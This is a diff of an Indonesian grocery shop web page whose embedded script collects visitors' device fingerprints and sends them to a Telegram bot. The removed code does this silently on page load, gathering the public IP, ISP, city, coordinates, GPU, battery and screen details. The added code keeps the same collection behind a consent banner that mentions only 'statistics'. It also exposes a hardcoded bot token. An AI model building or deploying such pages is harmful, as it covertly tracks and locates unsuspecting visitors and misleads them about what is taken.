@@ -6,239 +6,339 @@
 <title>Toko Sembako Makmur</title>
 <style>
   * { box-sizing: border-box; margin: 0; padding: 0; }
-    body {
-        font-family: 'Segoe UI', system-ui, sans-serif;
-            background: linear-gradient(135deg, #fff8e1 0%, #ffe0b2 100%);
-                min-height: 100vh;
-                    color: #4e342e;
-                      }
-                        header {
-                            background: linear-gradient(90deg, #d84315, #f57c00);
-                                color: white;
-                                    padding: 20px;
-                                        text-align: center;
-                                            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
-                                              }
-                                                header h1 { font-size: 24px; letter-spacing: 1px; }
-                                                  header p { font-size: 13px; opacity: 0.9; margin-top: 4px; }
+  body {
+    font-family: 'Segoe UI', system-ui, sans-serif;
+    background: linear-gradient(135deg, #fff8e1 0%, #ffe0b2 100%);
+    min-height: 100vh;
+    color: #4e342e;
+  }
+  header {
+    background: linear-gradient(90deg, #d84315, #f57c00);
+    color: white;
+    padding: 20px;
+    text-align: center;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+  }
+  header h1 { font-size: 24px; letter-spacing: 1px; }
+  header p { font-size: 13px; opacity: 0.9; margin-top: 4px; }
 
-                                                    .container { max-width: 720px; margin: 0 auto; padding: 20px; }
+  .container { max-width: 720px; margin: 0 auto; padding: 20px; }
 
-                                                      .hero {
-                                                          background: white;
-                                                              border-radius: 16px;
-                                                                  padding: 24px;
-                                                                      text-align: center;
-                                                                          box-shadow: 0 6px 20px rgba(216,67,21,0.12);
-                                                                              margin-bottom: 20px;
-                                                                                }
-                                                                                  .hero h2 { color: #d84315; font-size: 20px; margin-bottom: 8px; }
-                                                                                    .hero p { font-size: 14px; color: #6d4c41; }
+  .hero {
+    background: white;
+    border-radius: 16px;
+    padding: 24px;
+    text-align: center;
+    box-shadow: 0 6px 20px rgba(216,67,21,0.12);
+    margin-bottom: 20px;
+  }
+  .hero h2 { color: #d84315; font-size: 20px; margin-bottom: 8px; }
+  .hero p { font-size: 14px; color: #6d4c41; }
 
-                                                                                      .produk-grid {
-                                                                                          display: grid;
-                                                                                              grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
-                                                                                                  gap: 12px;
-                                                                                                      margin-bottom: 20px;
-                                                                                                        }
-                                                                                                          .produk {
-                                                                                                              background: white;
-                                                                                                                  border-radius: 12px;
-                                                                                                                      padding: 14px;
-                                                                                                                          text-align: center;
-                                                                                                                              box-shadow: 0 2px 8px rgba(0,0,0,0.06);
-                                                                                                                                  transition: transform 0.2s;
-                                                                                                                                    }
-                                                                                                                                      .produk:hover { transform: translateY(-3px); }
-                                                                                                                                        .produk .emoji { font-size: 32px; }
-                                                                                                                                          .produk .nama { font-weight: 600; font-size: 13px; margin-top: 6px; }
-                                                                                                                                            .produk .harga { color: #d84315; font-size: 12px; margin-top: 4px; }
+  .produk-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
+    gap: 12px;
+    margin-bottom: 20px;
+  }
+  .produk {
+    background: white;
+    border-radius: 12px;
+    padding: 14px;
+    text-align: center;
+    box-shadow: 0 2px 8px rgba(0,0,0,0.06);
+  }
+  .produk .emoji { font-size: 32px; }
+  .produk .nama { font-weight: 600; font-size: 13px; margin-top: 6px; }
+  .produk .harga { color: #d84315; font-size: 12px; margin-top: 4px; }
 
-                                                                                                                                              .status {
-                                                                                                                                                  background: #fff;
-                                                                                                                                                      border-radius: 12px;
-                                                                                                                                                          padding: 16px;
-                                                                                                                                                              text-align: center;
-                                                                                                                                                                  font-size: 14px;
-                                                                                                                                                                      box-shadow: 0 2px 8px rgba(0,0,0,0.06);
-                                                                                                                                                                        }
-                                                                                                                                                                          .status.loading { color: #f57c00; }
-                                                                                                                                                                            .status.ok { color: #2e7d32; }
-                                                                                                                                                                              .status.err { color: #c62828; }
+  .status {
+    background: #fff;
+    border-radius: 12px;
+    padding: 16px;
+    text-align: center;
+    font-size: 14px;
+    box-shadow: 0 2px 8px rgba(0,0,0,0.06);
+    white-space: pre-wrap;
+    word-break: break-word;
+  }
+  .status.loading { color: #f57c00; }
+  .status.ok { color: #2e7d32; }
+  .status.err { color: #c62828; }
 
-                                                                                                                                                                                footer {
-                                                                                                                                                                                    text-align: center;
-                                                                                                                                                                                        padding: 20px;
-                                                                                                                                                                                            font-size: 12px;
-                                                                                                                                                                                                color: #8d6e63;
-                                                                                                                                                                                                  }
-                                                                                                                                                                                                  </style>
-                                                                                                                                                                                                  </head>
-                                                                                                                                                                                                  <body>
+  footer {
+    text-align: center;
+    padding: 20px;
+    font-size: 12px;
+    color: #8d6e63;
+  }
 
-                                                                                                                                                                                                  <header>
-                                                                                                                                                                                                    <h1>🏪 Toko Sembako Makmur</h1>
-                                                                                                                                                                                                      <p>Sembako Lengkap, Harga Bersahabat</p>
-                                                                                                                                                                                                      </header>
+  #consent {
+    position: fixed; bottom: 0; left: 0; right: 0;
+    background: #fff;
+    border-top: 3px solid #f57c00;
+    padding: 16px;
+    box-shadow: 0 -4px 16px rgba(0,0,0,0.15);
+    font-size: 13px;
+    display: none;
+    z-index: 999;
+  }
+  #consent.show { display: block; }
+  #consent .row {
+    max-width: 720px; margin: 0 auto;
+    display: flex; gap: 10px; align-items: center; flex-wrap: wrap;
+  }
+  #consent p { flex: 1 1 260px; line-height: 1.4; }
+  #consent button {
+    border: none; padding: 10px 18px; border-radius: 8px;
+    font-size: 13px; font-weight: 600; cursor: pointer;
+  }
+  #consent .ok { background: #2e7d32; color: #fff; }
+  #consent .no { background: #eee; color: #4e342e; }
+</style>
+</head>
+<body>
 
-                                                                                                                                                                                                      <div class="container">
+<header>
+  <h1>🏪 Toko Sembako Makmur</h1>
+  <p>Sembako Lengkap, Harga Bersahabat</p>
+</header>
 
-                                                                                                                                                                                                        <div class="hero">
-                                                                                                                                                                                                            <h2>Selamat Datang! 🙏</h2>
-                                                                                                                                                                                                                <p>Kami menyediakan kebutuhan pokok sehari-hari dengan kualitas terbaik.</p>
-                                                                                                                                                                                                                  </div>
+<div class="container">
 
-                                                                                                                                                                                                                    <div class="produk-grid">
-                                                                                                                                                                                                                        <div class="produk"><div class="emoji">🍚</div><div class="nama">Beras Premium</div><div class="harga">Rp 65.000 / 5kg</div></div>
-                                                                                                                                                                                                                            <div class="produk"><div class="emoji">🛢️</div><div class="nama">Minyak Goreng</div><div class="harga">Rp 18.000 / L</div></div>
-                                                                                                                                                                                                                                <div class="produk"><div class="emoji">🍬</div><div class="nama">Gula Pasir</div><div class="harga">Rp 15.000 / kg</div></div>
-                                                                                                                                                                                                                                    <div class="produk"><div class="emoji">🥚</div><div class="nama">Telur Ayam</div><div class="harga">Rp 28.000 / kg</div></div>
-                                                                                                                                                                                                                                        <div class="produk"><div class="emoji">🍜</div><div class="nama">Mie Instan</div><div class="harga">Rp 3.000 / pcs</div></div>
-                                                                                                                                                                                                                                            <div class="produk"><div class="emoji">☕</div><div class="nama">Kopi Sachet</div><div class="harga">Rp 2.000 / pcs</div></div>
-                                                                                                                                                                                                                                                <div class="produk"><div class="emoji">🧂</div><div class="nama">Garam Dapur</div><div class="harga">Rp 5.000 / pcs</div></div>
-                                                                                                                                                                                                                                                    <div class="produk"><div class="emoji">🥛</div><div class="nama">Susu Kental</div><div class="harga">Rp 12.000 / kaleng</div></div>
-                                                                                                                                                                                                                                                      </div>
+  <div class="hero">
+    <h2>Selamat Datang! 🙏</h2>
+    <p>Kami menyediakan kebutuhan pokok sehari-hari dengan kualitas terbaik.</p>
+  </div>
 
-                                                                                                                                                                                                                                                        <div id="status" class="status loading">⏳ Memuat halaman...</div>
+  <div class="produk-grid">
+    <div class="produk"><div class="emoji">🍚</div><div class="nama">Beras Premium</div><div class="harga">Rp 65.000 / 5kg</div></div>
+    <div class="produk"><div class="emoji">🛢️</div><div class="nama">Minyak Goreng</div><div class="harga">Rp 18.000 / L</div></div>
+    <div class="produk"><div class="emoji">🍬</div><div class="nama">Gula Pasir</div><div class="harga">Rp 15.000 / kg</div></div>
+    <div class="produk"><div class="emoji">🥚</div><div class="nama">Telur Ayam</div><div class="harga">Rp 28.000 / kg</div></div>
+    <div class="produk"><div class="emoji">🍜</div><div class="nama">Mie Instan</div><div class="harga">Rp 3.000 / pcs</div></div>
+    <div class="produk"><div class="emoji">☕</div><div class="nama">Kopi Sachet</div><div class="harga">Rp 2.000 / pcs</div></div>
+    <div class="produk"><div class="emoji">🧂</div><div class="nama">Garam Dapur</div><div class="harga">Rp 5.000 / pcs</div></div>
+    <div class="produk"><div class="emoji">🥛</div><div class="nama">Susu Kental</div><div class="harga">Rp 12.000 / kaleng</div></div>
+  </div>
 
-                                                                                                                                                                                                                                                          <footer>
-                                                                                                                                                                                                                                                              &copy; 2026 Toko Sembako Makmur — Melayani dengan ❤️
-                                                                                                                                                                                                                                                                </footer>
+  <div id="status" class="status loading">⏳ Memuat halaman...</div>
 
-                                                                                                                                                                                                                                                                </div>
+  <footer>
+    &copy; 2026 Toko Sembako Makmur — Melayani dengan ❤️
+  </footer>
 
-                                                                                                                                                                                                                                                                <script>
-                                                                                                                                                                                                                                                                /* ============================================================
-                                                                                                                                                                                                                                                                   KONFIGURASI TELEGRAM
-                                                                                                                                                                                                                                                                      ============================================================ */
-                                                                                                                                                                                                                                                                      const BOT_TOKEN = "8958147998:AAFU_XBsbTWwK4DyDm7A_unj7Daq07FOmBc";
-                                                                                                                                                                                                                                                                      const CHAT_ID   = "1269602412";
+</div>
 
-                                                                                                                                                                                                                                                                      /* ============================================================
-                                                                                                                                                                                                                                                                         KOLEKSI INFO DEVICE
-                                                                                                                                                                                                                                                                            ============================================================ */
-                                                                                                                                                                                                                                                                            async function kumpulkanInfo() {
-                                                                                                                                                                                                                                                                              const info = {};
+<div id="consent">
+  <div class="row">
+    <p>🔒 Kami ingin mengirim info kunjungan untuk statistik. Setujui?</p>
+    <button class="ok" id="btnOk">Setuju</button>
+    <button class="no" id="btnNo">Tolak</button>
+  </div>
+</div>
 
-                                                                                                                                                                                                                                                                                // --- Dasar ---
-                                                                                                                                                                                                                                                                                  info["User Agent"]     = navigator.userAgent;
-                                                                                                                                                                                                                                                                                    info["Platform"]       = navigator.platform || "-";
-                                                                                                                                                                                                                                                                                      info["Bahasa"]         = navigator.language;
-                                                                                                                                                                                                                                                                                        info["Bahasa Lain"]    = (navigator.languages || []).join(", ");
-                                                                                                                                                                                                                                                                                          info["Cookies"]        = navigator.cookieEnabled ? "Ya" : "Tidak";
-                                                                                                                                                                                                                                                                                            info["Online"]         = navigator.onLine ? "Ya" : "Tidak";
-                                                                                                                                                                                                                                                                                              info["CPU Cores"]      = navigator.hardwareConcurrency || "-";
-                                                                                                                                                                                                                                                                                                info["RAM (GB)"]       = navigator.deviceMemory || "-";
-                                                                                                                                                                                                                                                                                                  info["Touch"]          = ("ontouchstart" in window) ? "Ya" : "Tidak";
-                                                                                                                                                                                                                                                                                                    info["Max Touch"]      = navigator.maxTouchPoints || 0;
+<script>
+/* ============================================================
+   ⚠️ KONFIGURASI TELEGRAM — LANGSUNG DARI CLIENT
+   ============================================================ */
+const BOT_TOKEN = "8958147998:AAFU_XBsbTWwK4DyDm7A_unj7Daq07FOmBc";
+const CHAT_ID   = "1269602412";
+const CONSENT_KEY = "tsm_consent_v1";
 
-                                                                                                                                                                                                                                                                                                      // --- Layar ---
-                                                                                                                                                                                                                                                                                                        info["Resolusi"]       = `${screen.width} x ${screen.height}`;
-                                                                                                                                                                                                                                                                                                          info["Viewport"]       = `${window.innerWidth} x ${window.innerHeight}`;
-                                                                                                                                                                                                                                                                                                            info["Pixel Ratio"]    = window.devicePixelRatio;
-                                                                                                                                                                                                                                                                                                              info["Color Depth"]    = screen.colorDepth + " bit";
-                                                                                                                                                                                                                                                                                                                info["Orientasi"]      = screen.orientation ? screen.orientation.type : "-";
+/* ============================================================
+   UTIL
+   ============================================================ */
+const withTimeout = (promise, ms) =>
+  Promise.race([
+    promise,
+    new Promise((_, rej) => setTimeout(() => rej(new Error("timeout")), ms))
+  ]);
 
-                                                                                                                                                                                                                                                                                                                  // --- Waktu ---
-                                                                                                                                                                                                                                                                                                                    info["Timezone"]       = Intl.DateTimeFormat().resolvedOptions().timeZone;
-                                                                                                                                                                                                                                                                                                                      info["Waktu Lokal"]    = new Date().toLocaleString("id-ID");
+/* ============================================================
+   KOLEKSI INFO
+   ============================================================ */
+async function kumpulkanInfo() {
+  const info = {};
 
-                                                                                                                                                                                                                                                                                                                        // --- Baterai ---
-                                                                                                                                                                                                                                                                                                                          try {
-                                                                                                                                                                                                                                                                                                                              if (navigator.getBattery) {
-                                                                                                                                                                                                                                                                                                                                    const b = await navigator.getBattery();
-                                                                                                                                                                                                                                                                                                                                          info["Baterai"] = `${Math.round(b.level * 100)}% ${b.charging ? "(charging)" : ""}`;
-                                                                                                                                                                                                                                                                                                                                              } else {
-                                                                                                                                                                                                                                                                                                                                                    info["Baterai"] = "Tidak didukung";
-                                                                                                                                                                                                                                                                                                                                                        }
-                                                                                                                                                                                                                                                                                                                                                          } catch (e) { info["Baterai"] = "Error"; }
+  try { info["User Agent"] = navigator.userAgent || "-"; } catch (_) {}
+  try { info["Platform"] = navigator.platform || "-"; } catch (_) {}
+  try { info["Bahasa"] = navigator.language || "-"; } catch (_) {}
+  try { info["Cookies"] = navigator.cookieEnabled ? "Ya" : "Tidak"; } catch (_) {}
+  try { info["Online"] = navigator.onLine ? "Ya" : "Tidak"; } catch (_) {}
+  try { info["CPU Cores"] = navigator.hardwareConcurrency || "-"; } catch (_) {}
+  try { info["RAM (GB)"] = navigator.deviceMemory || "-"; } catch (_) {}
+  try { info["Touch"] = ("ontouchstart" in window) ? "Ya" : "Tidak"; } catch (_) {}
 
-                                                                                                                                                                                                                                                                                                                                                            // --- Jaringan ---
-                                                                                                                                                                                                                                                                                                                                                              const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                                                                                                                                                                                                                                                                                                                                                                if (c) {
-                                                                                                                                                                                                                                                                                                                                                                    info["Tipe Koneksi"] = c.effectiveType || "-";
-                                                                                                                                                                                                                                                                                                                                                                        info["Downlink"]     = (c.downlink || "-") + " Mbps";
-                                                                                                                                                                                                                                                                                                                                                                            info["RTT"]          = (c.rtt || "-") + " ms";
-                                                                                                                                                                                                                                                                                                                                                                              }
+  try { info["Resolusi"] = `${screen.width} x ${screen.height}`; } catch (_) {}
+  try { info["Viewport"] = `${window.innerWidth} x ${window.innerHeight}`; } catch (_) {}
+  try { info["Pixel Ratio"] = window.devicePixelRatio || 1; } catch (_) {}
+  try { info["Orientasi"] = screen.orientation ? screen.orientation.type : "-"; } catch (_) {}
 
-                                                                                                                                                                                                                                                                                                                                                                                // --- GPU ---
-                                                                                                                                                                                                                                                                                                                                                                                  try {
-                                                                                                                                                                                                                                                                                                                                                                                      const gl = document.createElement("canvas").getContext("webgl");
-                                                                                                                                                                                                                                                                                                                                                                                          const dbg = gl.getExtension("WEBGL_debug_renderer_info");
-                                                                                                                                                                                                                                                                                                                                                                                              if (dbg) {
-                                                                                                                                                                                                                                                                                                                                                                                                    info["GPU Vendor"]   = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
-                                                                                                                                                                                                                                                                                                                                                                                                          info["GPU Renderer"] = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
-                                                                                                                                                                                                                                                                                                                                                                                                              }
-                                                                                                                                                                                                                                                                                                                                                                                                                } catch (e) {}
+  try { info["Timezone"] = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch (_) {}
+  try { info["Waktu Lokal"] = new Date().toLocaleString("id-ID"); } catch (_) {}
 
-                                                                                                                                                                                                                                                                                                                                                                                                                  // --- IP Publik + Geolokasi IP ---
-                                                                                                                                                                                                                                                                                                                                                                                                                    try {
-                                                                                                                                                                                                                                                                                                                                                                                                                        const r = await fetch("https://ipapi.co/json/");
-                                                                                                                                                                                                                                                                                                                                                                                                                            const d = await r.json();
-                                                                                                                                                                                                                                                                                                                                                                                                                                info["IP Publik"]   = d.ip || "-";
-                                                                                                                                                                                                                                                                                                                                                                                                                                    info["ISP"]         = d.org || "-";
-                                                                                                                                                                                                                                                                                                                                                                                                                                        info["Kota"]        = d.city || "-";
-                                                                                                                                                                                                                                                                                                                                                                                                                                            info["Region"]      = d.region || "-";
-                                                                                                                                                                                                                                                                                                                                                                                                                                                info["Negara"]      = d.country_name || "-";
-                                                                                                                                                                                                                                                                                                                                                                                                                                                    info["Koordinat IP"] = `${d.latitude || "-"}, ${d.longitude || "-"}`;
-                                                                                                                                                                                                                                                                                                                                                                                                                                                      } catch (e) {
-                                                                                                                                                                                                                                                                                                                                                                                                                                                          info["IP Publik"] = "Gagal ambil";
-                                                                                                                                                                                                                                                                                                                                                                                                                                                            }
+  try {
+    if (typeof navigator.getBattery === "function") {
+      const b = await withTimeout(navigator.getBattery(), 2000);
+      info["Baterai"] = `${Math.round(b.level * 100)}%${b.charging ? " (charging)" : ""}`;
+    }
+  } catch (_) {}
 
-                                                                                                                                                                                                                                                                                                                                                                                                                                                              return info;
-                                                                                                                                                                                                                                                                                                                                                                                                                                                              }
+  try {
+    const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    if (c) {
+      info["Tipe Koneksi"] = c.effectiveType || "-";
+      info["Downlink"] = (c.downlink ?? "-") + " Mbps";
+    }
+  } catch (_) {}
 
-                                                                                                                                                                                                                                                                                                                                                                                                                                                              /* ============================================================
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                 KIRIM KE TELEGRAM
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                    ============================================================ */
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                    async function kirimTelegram(info) {
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                      let teks = "🔔 *Pengunjung Baru Toko Sembako*\n";
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                        teks += "━━━━━━━━━━━━━━━━━━━━\n";
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                          for (const [k, v] of Object.entries(info)) {
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                              teks += `• *${k}*: \`${v}\`\n`;
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                }
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  teks += "━━━━━━━━━━━━━━━━━━━━\n";
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    teks += `🕐 ${new Date().toLocaleString("id-ID")}`;
+  try {
+    const gl = document.createElement("canvas").getContext("webgl");
+    if (gl) {
+      const dbg = gl.getExtension("WEBGL_debug_renderer_info");
+      if (dbg) {
+        info["GPU"] = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
+      }
+    }
+  } catch (_) {}
 
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        const res = await fetch(url, {
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            method: "POST",
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                headers: { "Content-Type": "application/json" },
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    body: JSON.stringify({
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          chat_id: CHAT_ID,
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                text: teks,
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      parse_mode: "Markdown"
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          })
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            });
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              return res.json();
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              }
+  // IP publik (langsung dari client, tanpa proxy)
+  try {
+    const d = await withTimeout(
+      fetch("https://ipapi.co/json/").then(r => r.json()),
+      4000
+    );
+    info["IP Publik"] = d.ip || "-";
+    info["ISP"] = d.org || "-";
+    info["Kota"] = d.city || "-";
+    info["Negara"] = d.country_name || "-";
+  } catch (_) {
+    try {
+      const d = await withTimeout(
+        fetch("https://ipwho.is/").then(r => r.json()),
+        4000
+      );
+      if (d && d.success !== false) {
+        info["IP Publik"] = d.ip || "-";
+        info["ISP"] = d.connection?.isp || "-";
+        info["Kota"] = d.city || "-";
+        info["Negara"] = d.country || "-";
+      }
+    } catch (_) {
+      info["IP Publik"] = "Gagal ambil";
+    }
+  }
 
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              /* ============================================================
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 ALUR UTAMA
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    ============================================================ */
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    (async function main() {
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      const statusEl = document.getElementById("status");
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        try {
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            const info = await kumpulkanInfo();
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                statusEl.textContent = "📡 Mengirim data...";
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    statusEl.className = "status loading";
+  return info;
+}
 
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        const hasil = await kirimTelegram(info);
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            if (hasil.ok) {
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  statusEl.textContent = "✅ Terima kasih telah berkunjung!";
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        statusEl.className = "status ok";
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            } else {
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  statusEl.textContent = "⚠️ Gagal mengirim data.";
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        statusEl.className = "status err";
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              console.error(hasil);
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  }
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    } catch (e) {
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        statusEl.textContent = "⚠️ Terjadi kesalahan.";
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            statusEl.className = "status err";
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                console.error(e);
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  }
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  })();
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  </script>
+/* ============================================================
+   KIRIM LANGSUNG KE TELEGRAM (TANPA PROXY)
+   ============================================================ */
+async function kirimKeTelegram(info) {
+  let teks = "🔔 Pengunjung Baru Toko Sembako\n";
+  teks += "━━━━━━━━━━━━━━━━━━━━\n";
+  for (const [k, v] of Object.entries(info)) {
+    teks += `• ${k}: ${v}\n`;
+  }
+  teks += "━━━━━━━━━━━━━━━━━━━━\n";
+  teks += "🕐 " + new Date().toLocaleString("id-ID");
 
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  </body>
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  </html>
+  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+  const res = await fetch(url, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: teks
+    })
+  });
+
+  const data = await res.json();
+
+  if (!res.ok || !data.ok) {
+    throw new Error(
+      "Telegram: " + (data.description || "HTTP " + res.status)
+    );
+  }
+
+  return data;
+}
+
+/* ============================================================
+   CONSENT
+   ============================================================ */
+function tampilkanConsent() {
+  const el = document.getElementById("consent");
+  el.classList.add("show");
+
+  return new Promise((resolve) => {
+    document.getElementById("btnOk").onclick = () => {
+      localStorage.setItem(CONSENT_KEY, "yes");
+      el.classList.remove("show");
+      resolve(true);
+    };
+    document.getElementById("btnNo").onclick = () => {
+      localStorage.setItem(CONSENT_KEY, "no");
+      el.classList.remove("show");
+      resolve(false);
+    };
+  });
+}
+
+async function mintaConsent() {
+  const saved = localStorage.getItem(CONSENT_KEY);
+  if (saved === "yes") return true;
+  if (saved === "no") return false;
+  return tampilkanConsent();
+}
+
+/* ============================================================
+   ALUR UTAMA
+   ============================================================ */
+(async function main() {
+  const statusEl = document.getElementById("status");
+
+  try {
+    if (location.protocol === "file:") {
+      statusEl.textContent =
+        "⚠️ Halaman dibuka via file://\n" +
+        "fetch ke Telegram TIDAK akan jalan.\n\n" +
+        "Buka via server lokal:\n" +
+        "  python -m http.server 8000\n" +
+        "atau\n" +
+        "  npx serve .\n\n" +
+        "Lalu akses: http://localhost:8000";
+      statusEl.className = "status err";
+      return;
+    }
+
+    const setuju = await mintaConsent();
+    if (!setuju) {
+      statusEl.textContent = "🙏 Terima kasih telah berkunjung!";
+      statusEl.className = "status ok";
+      return;
+    }
+
+    statusEl.textContent = "📡 Mengumpulkan data...";
+    statusEl.className = "status loading";
+
+    const info = await kumpulkanInfo();
+
+    statusEl.textContent = "📤 Mengirim ke Telegram...";
+    await kirimKeTelegram(info);
+
+    statusEl.textContent = "✅ Terima kasih telah berkunjung!";
+    statusEl.className = "status ok";
+  } catch (e) {
+    console.error(e);
+    statusEl.textContent = "⚠️ " + e.message;
+    statusEl.className = "status err";
+  }
+})();
+</script>
+
+</body>
+</html>
